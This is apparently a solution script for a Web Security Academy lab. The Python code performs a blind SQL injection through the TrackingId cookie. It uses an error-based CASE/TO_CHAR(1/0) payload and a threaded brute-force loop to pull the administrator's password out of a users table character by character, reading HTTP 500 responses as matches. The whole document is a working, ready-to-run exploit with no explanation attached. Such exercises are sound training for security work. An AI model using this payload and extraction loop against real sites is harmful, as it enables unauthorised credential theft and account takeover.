import requests
import string
import concurrent.futures

url = "https://0a9400df03c8381f80a430ef0089001e.web-security-academy.net/"
cookievalue = ""
password = ""
cookies = {"TrackingId": cookievalue}
characters = list(string.ascii_lowercase)
characters = characters + list(string.digits)


def guess_password(i, char):
    cookievalue = "x' || (SELECT CASE WHEN (SUBSTR(password,{},1) = '{}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '".format(
        i, char
    )
    cookies = {"TrackingId": cookievalue}
    r = requests.get(url, cookies=cookies)
    if r.status_code == 500:
        return char
    return None


with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(1, 21):
        future_to_char = {
            executor.submit(guess_password, i, char): char for char in characters
        }
        for future in concurrent.futures.as_completed(future_to_char):
            char = future_to_char[future]
            try:
                result = future.result()
                if result is not None:
                    print(result)
                    password = password + result
            except Exception as exc:
                print("%r generated an exception: %s" % (char, exc))

print("Password is: " + password)
